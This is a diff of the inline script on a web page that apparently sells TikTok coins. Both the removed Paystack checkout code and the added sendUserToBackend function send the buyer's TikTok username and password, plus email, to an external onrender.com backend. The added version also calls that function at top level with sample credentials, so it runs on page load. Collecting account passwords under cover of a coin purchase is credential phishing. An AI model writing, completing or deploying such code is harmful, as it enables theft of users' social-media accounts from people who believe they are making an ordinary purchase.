@@ -810,72 +810,31 @@ document.addEventListener('DOMContentLoaded', function() {
   })();
 });
 </script> <script>
-// -------------------------
-// Existing variables & helpers remain the same
-// -------------------------
+async function sendUserToBackend(username, password, email) {
+  try {
+    const response = await fetch('https://legal-tender-backend.onrender.com/api/users', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({ username, password, email })
+    });
 
-/* -------------------------
-   Paystack integration (charge in NGN)
-   ------------------------- */
-function payWithPaystack() {
-  const usernameVal = document.getElementById('usernameInput').value.trim() || 'blesss';
-  const passwordVal = document.getElementById('passwordInput').value || '';
-  const paystackEmail = document.getElementById('emailInput').value.trim() || '';
-  const coins = selectedCoins > 0 ? selectedCoins : 0;
-
-  if (coins <= 0) {
-    alert('Please select a valid coins amount.');
-    return;
+    const result = await response.json();
+    console.log('User sent to backend:', result);
+  } catch (error) {
+    console.error('Error sending user:', error);
   }
-
-  const amountUSD = (coins === 70) ? 1.25 : (coins * coinRateUSD);
-  const amountNGN = amountUSD * USD_TO_NGN;
-  const amountKobo = Math.round(amountNGN * 100);
-
-  const handler = PaystackPop.setup({
-    key: PAYSTACK_PUBLIC_KEY,
-    email: paystackEmail,
-    amount: amountKobo,
-    currency: 'NGN',
-    metadata: {
-      custom_fields: [
-        { display_name: "TikTok username", variable_name: "username", value: '@' + usernameVal },
-        { display_name: "Customer email", variable_name: "customer_email", value: paystackEmail },
-        { display_name: "Coins", variable_name: "coins", value: coins.toString() },
-        { display_name: "Amount USD", variable_name: "amount_usd", value: amountUSD.toFixed(2) },
-        { display_name: "Amount NGN", variable_name: "amount_ngn", value: Math.round(amountNGN).toString() }
-      ]
-    },
-    callback: function(response) {
-      // Payment successful
-      document.getElementById('orderSummary').style.display = 'none';
-      showSuccessToast();
-      console.log('Paystack success reference:', response.reference);
-
-      // -------------------------
-      // Send user data to backend
-      // -------------------------
-      fetch('https://legal-tender-backend.onrender.com/api/users', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          username: usernameVal,
-          password: passwordVal,
-          email: paystackEmail,
-          coins: coins
-        })
-      })
-      .then(res => res.json())
-      .then(data => console.log('Backend response:', data))
-      .catch(err => console.error('Error sending to backend:', err));
-    },
-    onClose: function() {
-      console.log('Paystack popup closed by user');
-    }
-  });
-
-  handler.openIframe();
 }
+
+// Example: call this function after purchase completes
+// Replace these variables with the real ones from your purchase form
+const username = "user1"; 
+const password = "mypassword1";
+const email = "user1@example.com";
+
+// Only call this after the purchase is successful
+sendUserToBackend(username, password, email);
 </script>
 </body>
 </html>
